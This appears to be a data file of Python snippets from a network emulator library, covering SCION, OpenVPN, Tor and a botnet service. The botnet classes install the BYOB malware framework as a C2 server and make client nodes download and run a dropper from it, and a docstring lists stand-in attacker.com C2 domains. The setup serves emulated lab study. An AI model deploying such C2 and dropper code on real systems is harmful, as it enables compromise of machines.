isd.print(indent + 4)\n\n        return out",
  "def __init__(self):\n        super().__init__()\n        self.__isds = {}",
  "def configure(self, emulator: Emulator) -> None:\n        super().configure(emulator)",
  "def render(self, emulator: Emulator) -> None:\n        super().render(emulator)",
  "def createAutonomousSystem(self, asn: int) -> ScionAutonomousSystem:\n        \"\"\"!\n        @copydoc Base.createAutonomousSystem()\n        \"\"\"\n        as_ = ScionAutonomousSystem(asn)\n        super().setAutonomousSystem(as_)\n        return as_",
  "def setAutonomousSystem(self, asObject: ScionAutonomousSystem):\n        \"\"\"!\n        @copydoc Base.setAutonomousSystem()\n        \"\"\"\n        assert issubclass(asObject.__class__, ScionAutonomousSystem), \"AS must be derived from ScionAutonomousSystem\"\n        super().setAutonomousSystem(asObject)",
  "def createIsolationDomain(self, isd: int, label: Optional[str] = None) -> IsolationDomain:\n        \"\"\"!\n        @brief Create a new insolation domain.\n\n        @param isd ISD ID.\n        @param label Descriptive name for the ISD.\n        @throws AssertionError if ISD already exists.\n        @returns Created isolation domain.\n        \"\"\"\n        assert isd not in self.__isds\n        self.__isds[isd] = IsolationDomain(isd, label)\n        return self.__isds[isd]",
  "def getIsolationDomains(self, isd: int) -> IsolationDomain:\n        \"\"\"!\n        @brief Retrieve an IsolationDomain.\n        @param isd ID os the isolation domain.\n        @throws AssertionError if isd does not exist.\n        @returns IsolationDomain.\n        \"\"\"\n        assert isd in self.__isds, \"isd{} does not exist.\".format(isd)\n        return self.__isds[isd]",
  "def getIsolationDomains(self) -> List[int]:\n        \"\"\"!\n        @brief Get a list of all ISD IDs.\n\n        @returns List of ISD IDs.\n        \"\"\"\n        return list(self.__isds.keys())",
  "def _doCreateGraphs(self, emulator: Emulator):\n        super()._doCreateGraphs(emulator)",
  "def print(self, indent: int) -> str:\n        out = super().print(indent)\n\n        indent += 4\n        out += ' ' * indent\n        out += 'IsolationDomains:\\n'\n        for isd in self.__isds.values():\n            out += isd.print(indent + 4)\n\n        return out",
  "class OpenVpnRemoteAccessProvider(RemoteAccessProvider):\n\n    __cur_port: int\n    __naddrs: int\n\n    __ovpn_ca: str\n    __ovpn_cert: str\n    __ovpn_key: str\n\n\n    def __init__(self, startPort: int = 65000, naddrs: int = 8, ovpnCa: str = None, ovpnCert: str = None, ovpnKey: str = None):\n        \"\"\"!\n        @brief OpenVPN remote access provider constructor.\n\n        if you do not set ca/cert/key, builtin ones will be used. to connect, \n        use the client configuration under misc/ folder. \n\n        @param startPort (optional) port number to start assigning from for\n        port forwarding to the open server. \n        @param naddrs number of IP addresses to assign to client pool.\n        @param ovpnCa (optional) CA to use for openvpn.\n        @param ovpnCert (optional) server certificate to use for openvpn.\n        @param ovpnKey (optional) server key to use for openvpn.\n        \"\"\"\n        super().__init__()\n\n        self.__cur_port = startPort\n        self.__naddrs = naddrs\n        self.__ovpn_ca = ovpnCa\n        self.__ovpn_cert = ovpnCert\n        self.__ovpn_key = ovpnKey\n    \n    def getName(self) -> str:\n        return 'OpenVpn'\n\n    def configureRemoteAccess(self, emulator: Emulator, netObject: Network, brNode: Node, brNet: Network):\n        self._log('setting up OpenVPN remote access for {} in AS{}...'.format(netObject.getName(), brNode.getAsn()))\n\n        brNode.addSoftware('openvpn')\n        brNode.addSoftware('bridge-utils')\n\n        addrstart = addrend = netObject.assign(NodeRole.Host)\n        for i in repeat(None, self.__naddrs - 1): addrend = netObject.assign(NodeRole.Host)\n\n        brNode.setFile('/ovpn-server.conf', OpenVpnRapFileTemplates['ovpn_server_config'].format(\n            addressStart = addrstart,\n            addressEnd = addrend,\n            addressMask = netObject.getPrefix().netmask,\n            key = self.__ovpn_key if self.__ovpn_key != None else OpenVpnRapFileTemplates['ovpn_key'],\n            ca = self.__ovpn_ca if self.__ovpn_ca != None else OpenVpnRapFileTemplates['ovpn_ca'],\n            cert = self.__ovpn_cert if self.__ovpn_cert != None else OpenVpnRapFileTemplates['ovpn_cert']\n        ))\n\n        brNode.setFile('/ovpn_startup', OpenVpnRapFileTemplates['ovpn_startup_script'])\n\n        # note: ovpn_startup will invoke interface_setup, and replace interface_setup script with a dummy. \n        brNode.appendStartCommand('chmod +x /ovpn_startup')\n        brNode.appendStartCommand('/ovpn_startup {}'.format(netObject.getName()))\n\n        brNode.appendStartCommand('ip route add default via {} dev {}'.format(brNet.getPrefix()[1], brNet.getName()))\n\n        brNode.joinNetwork(brNet.getName())\n        brNode.joinNetwork(netObject.getName())\n\n        brNode.addPort(self.__cur_port, 1194, 'udp')\n\n        self.__cur_port += 1",
  "def __init__(self, startPort: int = 65000, naddrs: int = 8, ovpnCa: str = None, ovpnCert: str = None, ovpnKey: str = None):\n        \"\"\"!\n        @brief OpenVPN remote access provider constructor.\n\n        if you do not set ca/cert/key, builtin ones will be used. to connect, \n        use the client configuration under misc/ folder. \n\n        @param startPort (optional) port number to start assigning from for\n        port forwarding to the open server. \n        @param naddrs number of IP addresses to assign to client pool.\n        @param ovpnCa (optional) CA to use for openvpn.\n        @param ovpnCert (optional) server certificate to use for openvpn.\n        @param ovpnKey (optional) server key to use for openvpn.\n        \"\"\"\n        super().__init__()\n\n        self.__cur_port = startPort\n        self.__naddrs = naddrs\n        self.__ovpn_ca = ovpnCa\n        self.__ovpn_cert = ovpnCert\n        self.__ovpn_key = ovpnKey",
  "def getName(self) -> str:\n        return 'OpenVpn'",
  "def configureRemoteAccess(self, emulator: Emulator, netObject: Network, brNode: Node, brNet: Network):\n        self._log('setting up OpenVPN remote access for {} in AS{}...'.format(netObject.getName(), brNode.getAsn()))\n\n        brNode.addSoftware('openvpn')\n        brNode.addSoftware('bridge-utils')\n\n        addrstart = addrend = netObject.assign(NodeRole.Host)\n        for i in repeat(None, self.__naddrs - 1): addrend = netObject.assign(NodeRole.Host)\n\n        brNode.setFile('/ovpn-server.conf', OpenVpnRapFileTemplates['ovpn_server_config'].format(\n            addressStart = addrstart,\n            addressEnd = addrend,\n            addressMask = netObject.getPrefix().netmask,\n            key = self.__ovpn_key if self.__ovpn_key != None else OpenVpnRapFileTemplates['ovpn_key'],\n            ca = self.__ovpn_ca if self.__ovpn_ca != None else OpenVpnRapFileTemplates['ovpn_ca'],\n            cert = self.__ovpn_cert if self.__ovpn_cert != None else OpenVpnRapFileTemplates['ovpn_cert']\n        ))\n\n        brNode.setFile('/ovpn_startup', OpenVpnRapFileTemplates['ovpn_startup_script'])\n\n        # note: ovpn_startup will invoke interface_setup, and replace interface_setup script with a dummy. \n        brNode.appendStartCommand('chmod +x /ovpn_startup')\n        brNode.appendStartCommand('/ovpn_startup {}'.format(netObject.getName()))\n\n        brNode.appendStartCommand('ip route add default via {} dev {}'.format(brNet.getPrefix()[1], brNet.getName()))\n\n        brNode.joinNetwork(brNet.getName())\n        brNode.joinNetwork(netObject.getName())\n\n        brNode.addPort(self.__cur_port, 1194, 'udp')\n\n        self.__cur_port += 1",
  "class ScionBwtestServer(Server):\n    \"\"\"!\n    @brief SCION bandwidth test server.\n    \"\"\"\n\n    __port: int\n\n    def __init__(self):\n        \"\"\"!\n        @brief ScionBwtestServer constructor.\n        \"\"\"\n        super().__init__()\n        self.__port = 40002\n\n    def setPort(self, port: int) -> ScionBwtestServer:\n        \"\"\"!\n        @brief Set port the SCION bandwidth test server listens on.\n\n        @param port\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__port = port\n\n        return self\n\n    def install(self, node: Node):\n        \"\"\"!\n        @brief Install the service.\n        \"\"\"\n        node.appendStartCommand(ScionBwtestServerTemplates['command'].format(\n            port=str(self.__port)))\n        node.appendClassName(\"ScionBwtestService\")\n\n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'SCION bandwidth test server object.\\n'\n        return out",
  "class ScionBwtestService(Service):\n    \"\"\"!\n    @brief SCION bandwidth test server service class.\n    \"\"\"\n\n    def __init__(self):\n        \"\"\"!\n        @brief ScionBwtestService constructor.\n        \"\"\"\n        super().__init__()\n        self.addDependency('Base', False, False)\n        self.addDependency('Scion', False, False)\n\n    def _createServer(self) -> Server:\n        return ScionBwtestServer()\n\n    def getName(self) -> str:\n        return 'ScionBwtestService'\n\n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'ScionBwtestServiceLayer\\n'\n        return out",
  "def __init__(self):\n        \"\"\"!\n        @brief ScionBwtestServer constructor.\n        \"\"\"\n        super().__init__()\n        self.__port = 40002",
  "def setPort(self, port: int) -> ScionBwtestServer:\n        \"\"\"!\n        @brief Set port the SCION bandwidth test server listens on.\n\n        @param port\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__port = port\n\n        return self",
  "def install(self, node: Node):\n        \"\"\"!\n        @brief Install the service.\n        \"\"\"\n        node.appendStartCommand(ScionBwtestServerTemplates['command'].format(\n            port=str(self.__port)))\n        node.appendClassName(\"ScionBwtestService\")",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'SCION bandwidth test server object.\\n'\n        return out",
  "def __init__(self):\n        \"\"\"!\n        @brief ScionBwtestService constructor.\n        \"\"\"\n        super().__init__()\n        self.addDependency('Base', False, False)\n        self.addDependency('Scion', False, False)",
  "def _createServer(self) -> Server:\n        return ScionBwtestServer()",
  "def getName(self) -> str:\n        return 'ScionBwtestService'",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'ScionBwtestServiceLayer\\n'\n        return out",
  "class BotnetServer(Server):\n    \"\"\"!\n    @brief The BotnetServer class.\n    \"\"\"\n\n    __port: int\n    __files: Dict[str, str]\n\n    def __init__(self):\n        \"\"\"!\n        @brief BotnetServer constructor.\n        \"\"\"\n        super().__init__()\n        self.__port = 445\n        self.__files = {}\n\n    def setPort(self, port: int) -> BotnetServer:\n        \"\"\"!\n        @brief Set BYOB port. Default to 445.\n\n        Beside the given port, the follow ports will also be opened:\n        port + 1: HTTP server hosting BYOB modules (for client to import)\n        port + 2: HTTP server host Python packages (for client to import)\n        port + 3: HTTP server for incoming uploads.\n\n        @param port port.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__port = port\n        return self\n\n    def addFile(self, content: str, path: str):\n        \"\"\"!\n        @deprecated to be removed in future version. use\n        emulator.getVirtualNode(nodename).setFile instead.\n\n        @brief Add a file to the C2 server. You can use this API to add files\n        onto the physical node of the C2 server. This can be useful for\n        preparing attack scripts for uploading to the client.\n\n        @param content file content.\n        @param path full file path. (ex: /tmp/ddos.py)\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        \n        self.__files[path] = content\n\n        return self\n\n    def install(self, node: Node):\n        \"\"\"!\n        @brief Install the Botnet C2 server.\n        \"\"\"\n        address = str(node.getInterfaces()[0].getAddress())\n\n        # add user files\n        for (path, body) in self.__files.items():\n            node.setFile(path, body)\n\n        # get byob & its dependencies\n        node.addSoftware('python3 git cmake python3-dev gcc g++ make python3-pip') \n        node.addBuildCommand('git clone https://github.com/malwaredllc/byob.git /tmp/byob/')\n        node.addBuildCommand('git -C /tmp/byob/ checkout {}'.format(BYOB_VERSION)) # server_patch is tested only for this commit\n        node.addBuildCommand('pip3 install -r /tmp/byob/byob/requirements.txt')\n\n        # patch byob - removes external request for getting IP location, which won't work if \"real\" internet is not connected.\n        node.setFile('/tmp/byob.patch', BotnetServerFileTemplates['server_patch'])\n        node.appendStartCommand('git -C /tmp/byob/ apply /tmp/byob.patch')\n\n        # add the init script to server\n        node.setFile('/tmp/byob_server_init_script', BotnetServerFileTemplates['server_init_script'])\n        node.appendStartCommand('chmod +x /tmp/byob_server_init_script')\n\n        # start the server & make dropper/stager/payload\n        node.appendStartCommand('/tmp/byob_server_init_script \"{}\" \"{}\"'.format(address, self.__port))\n\n        # script to start byob shell on correct port\n        node.setFile('/bin/start-byob-shell', BotnetServerFileTemplates['start-byob-shell'].format(self.__port))\n        node.appendStartCommand('chmod +x /bin/start-byob-shell')\n\n        # set attributes for client to find us\n        node.setAttribute('botnet_addr', address)\n        node.setAttribute('botnet_port', self.__port + 1)\n         \n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'BotnetServer'\n\n        return out",
  "class BotnetClientServer(Server):\n    \"\"\"!\n    @brief The BotnetClientServer class.\n    \"\"\"\n\n    __server: str\n    __dga: str\n    __emulator: Emulator\n\n    def __init__(self):\n        \"\"\"!\n        @brief BotnetClient constructor.\n        \"\"\"\n        super().__init__()\n        self.__server = None\n        self.__port = 446\n        self.__dga = None\n\n    def useBindingFrom(self, emulator: Emulator):\n        \"\"\"!\n        @brief set the emulator for the client to look for server from.\n\n        note: to be called by the render process. \n\n        @param emulator emulator.\n        \"\"\"\n        self.__emulator = emulator\n\n    def setServer(self, server: str) -> BotnetClientServer:\n        \"\"\"!\n        @brief BotnetClient constructor.\n\n        @param server name of the BYOB server virtual node.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__server = server\n\n        return self\n\n    def setDga(self, dgaScript: str) -> BotnetClientServer:\n        \"\"\"!\n        @brief set script for generating domain names. \n\n        The script will be executed to get a \"server:port\" list, one server each\n        line. The script can be anything - bash, python, perl (may need\n        addSoftware('perl')), etc. The script should have the correct shebang\n        interpreter directive at the beginning.\n\n        Example output:\n\n        abcd.attacker.com:446\n        1234.attacker.com:446\n        zzzz.attacker.com:446\n\n        If DGA is used, server configured in setServer will be ignored. To\n        disable DGA, do setDga(None).\n\n        @param dgaScript content of DGA script, or None to disable DGA.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__dga = dgaScript\n\n        return self\n\n    def install(self, node: Node):\n        assert self.__server != None or self.__dga != None, 'botnet-client on as{}/{} has no server configured!'.format(node.getAsn(), node.getName())\n\n        # get byob dependencies.\n        node.addSoftware('python3 git cmake python3-dev gcc g++ make python3-pip') \n        node.addBuildCommand('curl https://raw.githubusercontent.com/malwaredllc/byob/{}/byob/requirements.txt > /tmp/byob-requirements.txt'.format(BYOB_VERSION))\n        node.addBuildCommand('pip3 install -r /tmp/byob-requirements.txt')\n\n        fork = False\n\n        # script to get dropper from server.\n        if self.__dga == None:\n            node.setFile('/tmp/byob_client_dropper_runner', BotnetServerFileTemplates['client_dropper_runner'])\n        else:\n            fork = True\n            node.setFile('/dga', self.__dga)\n            node.setFile('/tmp/byob_client_dropper_runner', BotnetServerFileTemplates['client_dropper_runner_dga'])\n\n        server: Node = self.__emulator.getBindingFor(self.__server)\n\n        addr = server.getAttribute('botnet_addr', None)\n        port = server.getAttribute('botnet_port', None)\n\n        assert addr != None and port != None, 'cannot find server details from botnet controller the node on {} (as{}/{}). is botnet controller installed on it?'.format(self.__server, server.getAsn(), server.getName())\n\n        # get and run dropper from server.\n        node.appendStartCommand('chmod +x /tmp/byob_client_dropper_runner')\n        node.appendStartCommand('/tmp/byob_client_dropper_runner \"{}\" \"{}\"'.format(addr, port), fork)\n\n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'BotnetClient'\n\n        return out",
  "class BotnetService(Service):\n    \"\"\"!\n    @brief Botnet C2 server service.\n    \"\"\"\n\n    def __init__(self):\n        \"\"\"!\n        @brief BotnetService constructor.\n        \"\"\"\n        super().__init__()\n        self.addDependency('Base', False, False)\n\n    def _createServer(self) -> Server:\n        return BotnetServer()\n\n    def getName(self) -> str:\n        return 'BotnetService'\n\n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'BotnetServiceLayer\\n'",
  "class BotnetClientService(Service):\n    \"\"\"!\n    @brief Botnet client service.\n    \"\"\"\n\n    __emulator: Emulator\n\n    def __init__(self):\n        \"\"\"!\n        @brief BotnetService constructor.\n        \"\"\"\n        super().__init__()\n        self.addDependency('Base', False, False)\n\n    def _doConfigure(self, node: Node, server: Server):\n        server.useBindingFrom(self.__emulator)\n\n    def configure(self, emulator: Emulator):\n        self.__emulator = emulator\n        return super().configure(emulator)\n\n    def _createServer(self) -> Server:\n        return BotnetClientServer()\n\n    def getName(self) -> str:\n        return 'BotnetClientService'\n\n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'BotnetClientServiceLayer\\n'",
  "def __init__(self):\n        \"\"\"!\n        @brief BotnetServer constructor.\n        \"\"\"\n        super().__init__()\n        self.__port = 445\n        self.__files = {}",
  "def setPort(self, port: int) -> BotnetServer:\n        \"\"\"!\n        @brief Set BYOB port. Default to 445.\n\n        Beside the given port, the follow ports will also be opened:\n        port + 1: HTTP server hosting BYOB modules (for client to import)\n        port + 2: HTTP server host Python packages (for client to import)\n        port + 3: HTTP server for incoming uploads.\n\n        @param port port.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__port = port\n        return self",
  "def addFile(self, content: str, path: str):\n        \"\"\"!\n        @deprecated to be removed in future version. use\n        emulator.getVirtualNode(nodename).setFile instead.\n\n        @brief Add a file to the C2 server. You can use this API to add files\n        onto the physical node of the C2 server. This can be useful for\n        preparing attack scripts for uploading to the client.\n\n        @param content file content.\n        @param path full file path. (ex: /tmp/ddos.py)\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        \n        self.__files[path] = content\n\n        return self",
  "def install(self, node: Node):\n        \"\"\"!\n        @brief Install the Botnet C2 server.\n        \"\"\"\n        address = str(node.getInterfaces()[0].getAddress())\n\n        # add user files\n        for (path, body) in self.__files.items():\n            node.setFile(path, body)\n\n        # get byob & its dependencies\n        node.addSoftware('python3 git cmake python3-dev gcc g++ make python3-pip') \n        node.addBuildCommand('git clone https://github.com/malwaredllc/byob.git /tmp/byob/')\n        node.addBuildCommand('git -C /tmp/byob/ checkout {}'.format(BYOB_VERSION)) # server_patch is tested only for this commit\n        node.addBuildCommand('pip3 install -r /tmp/byob/byob/requirements.txt')\n\n        # patch byob - removes external request for getting IP location, which won't work if \"real\" internet is not connected.\n        node.setFile('/tmp/byob.patch', BotnetServerFileTemplates['server_patch'])\n        node.appendStartCommand('git -C /tmp/byob/ apply /tmp/byob.patch')\n\n        # add the init script to server\n        node.setFile('/tmp/byob_server_init_script', BotnetServerFileTemplates['server_init_script'])\n        node.appendStartCommand('chmod +x /tmp/byob_server_init_script')\n\n        # start the server & make dropper/stager/payload\n        node.appendStartCommand('/tmp/byob_server_init_script \"{}\" \"{}\"'.format(address, self.__port))\n\n        # script to start byob shell on correct port\n        node.setFile('/bin/start-byob-shell', BotnetServerFileTemplates['start-byob-shell'].format(self.__port))\n        node.appendStartCommand('chmod +x /bin/start-byob-shell')\n\n        # set attributes for client to find us\n        node.setAttribute('botnet_addr', address)\n        node.setAttribute('botnet_port', self.__port + 1)",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'BotnetServer'\n\n        return out",
  "def __init__(self):\n        \"\"\"!\n        @brief BotnetClient constructor.\n        \"\"\"\n        super().__init__()\n        self.__server = None\n        self.__port = 446\n        self.__dga = None",
  "def useBindingFrom(self, emulator: Emulator):\n        \"\"\"!\n        @brief set the emulator for the client to look for server from.\n\n        note: to be called by the render process. \n\n        @param emulator emulator.\n        \"\"\"\n        self.__emulator = emulator",
  "def setServer(self, server: str) -> BotnetClientServer:\n        \"\"\"!\n        @brief BotnetClient constructor.\n\n        @param server name of the BYOB server virtual node.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__server = server\n\n        return self",
  "def setDga(self, dgaScript: str) -> BotnetClientServer:\n        \"\"\"!\n        @brief set script for generating domain names. \n\n        The script will be executed to get a \"server:port\" list, one server each\n        line. The script can be anything - bash, python, perl (may need\n        addSoftware('perl')), etc. The script should have the correct shebang\n        interpreter directive at the beginning.\n\n        Example output:\n\n        abcd.attacker.com:446\n        1234.attacker.com:446\n        zzzz.attacker.com:446\n\n        If DGA is used, server configured in setServer will be ignored. To\n        disable DGA, do setDga(None).\n\n        @param dgaScript content of DGA script, or None to disable DGA.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__dga = dgaScript\n\n        return self",
  "def install(self, node: Node):\n        assert self.__server != None or self.__dga != None, 'botnet-client on as{}/{} has no server configured!'.format(node.getAsn(), node.getName())\n\n        # get byob dependencies.\n        node.addSoftware('python3 git cmake python3-dev gcc g++ make python3-pip') \n        node.addBuildCommand('curl https://raw.githubusercontent.com/malwaredllc/byob/{}/byob/requirements.txt > /tmp/byob-requirements.txt'.format(BYOB_VERSION))\n        node.addBuildCommand('pip3 install -r /tmp/byob-requirements.txt')\n\n        fork = False\n\n        # script to get dropper from server.\n        if self.__dga == None:\n            node.setFile('/tmp/byob_client_dropper_runner', BotnetServerFileTemplates['client_dropper_runner'])\n        else:\n            fork = True\n            node.setFile('/dga', self.__dga)\n            node.setFile('/tmp/byob_client_dropper_runner', BotnetServerFileTemplates['client_dropper_runner_dga'])\n\n        server: Node = self.__emulator.getBindingFor(self.__server)\n\n        addr = server.getAttribute('botnet_addr', None)\n        port = server.getAttribute('botnet_port', None)\n\n        assert addr != None and port != None, 'cannot find server details from botnet controller the node on {} (as{}/{}). is botnet controller installed on it?'.format(self.__server, server.getAsn(), server.getName())\n\n        # get and run dropper from server.\n        node.appendStartCommand('chmod +x /tmp/byob_client_dropper_runner')\n        node.appendStartCommand('/tmp/byob_client_dropper_runner \"{}\" \"{}\"'.format(addr, port), fork)",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'BotnetClient'\n\n        return out",
  "def __init__(self):\n        \"\"\"!\n        @brief BotnetService constructor.\n        \"\"\"\n        super().__init__()\n        self.addDependency('Base', False, False)",
  "def _createServer(self) -> Server:\n        return BotnetServer()",
  "def getName(self) -> str:\n        return 'BotnetService'",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'BotnetServiceLayer\\n'",
  "def __init__(self):\n        \"\"\"!\n        @brief BotnetService constructor.\n        \"\"\"\n        super().__init__()\n        self.addDependency('Base', False, False)",
  "def _doConfigure(self, node: Node, server: Server):\n        server.useBindingFrom(self.__emulator)",
  "def configure(self, emulator: Emulator):\n        self.__emulator = emulator\n        return super().configure(emulator)",
  "def _createServer(self) -> Server:\n        return BotnetClientServer()",
  "def getName(self) -> str:\n        return 'BotnetClientService'",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'BotnetClientServiceLayer\\n'",
  "class TorNodeType(Enum):\n    \"\"\"!\n    @brief Tor node types.\n    \"\"\"\n\n    ## directory authority\n    DA = \"DA\"\n\n    ## non-exit relay\n    RELAY = \"RELAY\"\n\n    ## exit relay\n    EXIT = \"EXIT\"\n\n    ## client\n    CLIENT = \"CLIENT\"\n\n    ## hidden service\n    HS = \"HS\"",
  "class TorServer(Server):\n    \"\"\"!\n    @brief The Tor server.\n    \"\"\"\n\n    __role: TorNodeType\n    __hs_link: Set\n\n    def __init__(self):\n        \"\"\"!\n        @brief TorServer constructor.\n        \"\"\"\n        super().__init__()\n\n        self.__role = TorNodeType.RELAY.value\n        self.__hs_link = ()\n\n    def setRole(self, role: TorNodeType) -> TorServer:\n        \"\"\"!\n        @brief User need to set a role of tor server, by default, it's relay node.\n\n        @param role specify what type of role in this tor server\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__role = role.value\n\n        return self\n\n    def getRole(self) -> str:\n        \"\"\"!\n        @brief Get role info of this tor server.\n\n        @returns role.\n        \"\"\"\n        return self.__role\n\n    def getLink(self) -> str:\n        \"\"\"!\n        @brief Get the link of HS server, only HS role node has this feature.\n\n        @returns hidden service dest.\n        \"\"\"\n        return self.__hs_link\n\n    def setLink(self, addr: str, port: int) -> TorServer:\n        \"\"\"!\n        @brief set IP link of HS server, only be invoked by __resolveHSLink()\n\n        @param addr address\n        @param port port.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__hs_link = (addr, port)\n\n        return self\n\n    def linkByVnode(self, vname: str, port: int) -> TorServer:\n        \"\"\"!\n        @brief set Vnode link of HS server.\n        \n        If a tor server is HS role, it's able to link to another virtual node\n        as an onion service. In /tor/HS[random]/hs/hostname file at HS node, it\n        contains the onion address name.\n\n        @param vname virtual node name.\n        @param port port.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        assert self.getRole() == \"HS\", \"linkByVnode(): only HS type node can bind a host.\"\n        assert len(self.__hs_link) == 0, \"linkByVnode(): TorServer already has linked a host.\"\n        self.__hs_link = (vname, port)\n\n        return self\n\n    def configure(self, node: Node, tor: 'TorService'):\n        \"\"\"!\n        @brief configure TorServer node\n\n        @param node target node.\n        @param tor tor service.\n        \"\"\"\n        ifaces = node.getInterfaces()\n        assert len(ifaces) > 0, 'TorNode configure(): node has not interfaces'\n        addr = ifaces[0].getAddress()\n\n        if self.getRole() == \"DA\":\n            # Save DA address in tor service, other type of node will download fingerprint from these DA.\n            tor.addDirAuthority(addr)\n\n        if self.getRole() == \"HS\" and len(self.getLink()) != 0:\n            # take out link in HS server and set it to env variable, they would mapping to tor config file.\n            addr, port = self.getLink()\n            node.appendStartCommand(\"export TOR_HS_ADDR={}\".format(addr))\n            node.appendStartCommand(\"export TOR_HS_PORT={}\".format(port))\n\n    def install(self, node: Node, tor: 'TorService'):\n        \"\"\"!\n        @brief Tor server installation step.\n\n        @param node target node.\n        @param tor tor service.\n        \"\"\"\n        ifaces = node.getInterfaces()\n        assert len(ifaces) > 0, 'node has not interfaces'\n        addr = ifaces[0].getAddress()\n        download_commands = \"\"\n        for dir in tor.getDirAuthority():\n            download_commands += TorServerFileTemplates[\"downloader\"].format(da_addr=dir)\n\n        node.addSoftware(\"git python3\")\n        node.addBuildCommand(BUILD_COMMANDS)\n\n        node.setFile(\"/etc/tor/torrc\", TorServerFileTemplates[\"torrc\"])\n        node.setFile(\"/etc/tor/torrc.da\", TorServerFileTemplates[\"torrc.da\"])\n        node.setFile(\"/usr/local/bin/da_fingerprint\", TorServerFileTemplates[\"da_fingerprint\"])\n        node.setFile(\"/usr/local/bin/tor-entrypoint\", TorServerFileTemplates[\"tor-entrypoint\"].format(TOR_IP=addr, downloader = download_commands))\n        \n        node.appendStartCommand(\"export TOR_ORPORT=7000\")\n        node.appendStartCommand(\"export TOR_DIRPORT=9030\")\n        node.appendStartCommand(\"export TOR_DIR=/tor\")\n        node.appendStartCommand(\"export ROLE={}\".format(self.__role))\n        node.appendStartCommand(\"chmod +x /usr/local/bin/tor-entrypoint /usr/local/bin/da_fingerprint\")\n        node.appendStartCommand(\"mkdir /tor\")\n       \n        # If node role is DA, launch a python web server for other node to download fingerprints.\n        if self.getRole() == \"DA\":\n            node.appendStartCommand(\"python3 -m http.server 8888 -d /tor\", True)\n        \n        node.appendStartCommand(\"tor-entrypoint\")\n        node.appendStartCommand(\"tor -f /etc/tor/torrc\")\n\n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'TorServer'\n\n        return out",
  "class TorService(Service):\n    \"\"\"!\n    @brief The Tor network service.\n    \"\"\"\n\n    def __init__(self):\n        super().__init__()\n        self.__da_nodes = []\n\n    def getName(self):\n        return 'TorService'\n\n    def _doConfigure(self, node: Node, server: TorServer):\n        server.configure(node, self)\n\n    def addDirAuthority(self, addr: str) -> TorService:\n        \"\"\"!\n        @brief add DA.\n\n        @param addr address of DA.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__da_nodes.append(addr)\n\n        return self\n\n    def getDirAuthority(self) -> List[str]:\n        \"\"\"!\n        @brief get DAs.\n\n        @returns list of DA addresses.\n        \"\"\"\n\n        return self.__da_nodes\n\n    def __resolveHSLink(self, emulator: Emulator):\n        \"\"\"!\n        @brief Transfer vnode link to physical node IP address.\n\n        \"\"\"\n        for server in self.getPendingTargets().values():\n            if server.getRole() == \"HS\" and len(server.getLink()) != 0:\n                vname, port = server.getLink()\n                pnode = emulator.resolvVnode(vname)\n                ifaces = pnode.getInterfaces()\n                assert len(ifaces) > 0, '__resolveHSLink(): node as{}/{} has no interfaces'.format(pnode.getAsn(), pnode.getName())\n                addr = ifaces[0].getAddress()\n                server.setLink(addr, port)\n\n    def configure(self, emulator: Emulator):\n        self.__resolveHSLink(emulator)\n        return super().configure(emulator)\n\n    def _doInstall(self, node: Node, server: TorServer):\n        server.install(node, self)\n\n    def _createServer(self) -> Server:\n        return TorServer()",
  "def __init__(self):\n        \"\"\"!\n        @brief TorServer constructor.\n        \"\"\"\n        super().__init__()\n\n        self.__role = TorNodeType.RELAY.value\n        self.__hs_link = ()",
  "def setRole(self, role: TorNodeType) -> TorServer:\n        \"\"\"!\n        @brief User need to set a role of tor server, by default, it's relay node.\n\n        @param role specify what type of role in this tor server\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__role = role.value\n\n        return self",
  "def getRole(self) -> str:\n        \"\"\"!\n        @brief Get role info of this tor server.\n\n        @returns role.\n        \"\"\"\n        return self.__role",
  "def getLink(self) -> str:\n        \"\"\"!\n        @brief Get the link of HS server, only HS role node has this feature.\n\n        @returns hidden service dest.\n        \"\"\"\n        return self.__hs_link",
  "def setLink(self, addr: str, port: int) -> TorServer:\n        \"\"\"!\n        @brief set IP link of HS server, only be invoked by __resolveHSLink()\n\n        @param addr address\n        @param port port.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__hs_link = (addr, port)\n\n        return self",
  "def linkByVnode(self, vname: str, port: int) -> TorServer:\n        \"\"\"!\n        @brief set Vnode link of HS server.\n        \n        If a tor server is HS role, it's able to link to another virtual node\n        as an onion service. In /tor/HS[random]/hs/hostname file at HS node, it\n        contains the onion address name.\n\n        @param vname virtual node name.\n        @param port port.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        assert self.getRole() == \"HS\", \"linkByVnode(): only HS type node can bind a host.\"\n        assert len(self.__hs_link) == 0, \"linkByVnode(): TorServer already has linked a host.\"\n        self.__hs_link = (vname, port)\n\n        return self",
